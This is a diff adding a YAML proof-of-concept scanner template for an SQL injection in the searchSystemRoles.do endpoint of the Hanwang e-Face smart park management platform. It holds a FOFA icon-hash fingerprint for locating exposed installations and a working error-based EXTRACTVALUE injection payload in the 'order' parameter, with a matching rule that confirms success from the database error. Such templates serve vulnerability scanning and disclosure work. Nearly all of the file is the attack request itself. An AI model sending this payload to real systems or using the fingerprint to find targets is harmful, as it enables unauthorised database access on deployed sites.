@@ -1,0 +1,17 @@
+id: poc-yaml-hw-e-face-pass-spmp-searchsystemroles-do-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 searchSystemRoles.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /manage/systemRoleMgr/searchSystemRoles.do?branchId=1&columnKey=id&deviceName=test&id=1&order=OR+EXTRACTVALUE(2605,CONCAT(0x5c,md5({{.t1}}),0x5c,(SELECT+(ELT(2605=2605,1)))))&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS
+  expression: status_code == 200 && contains(body,"success") && contains(body,"XPATH
+    syntax error") && contains(body,"java.sql.SQLException") && contains(body,substr(t2,0,31))
+transport: http
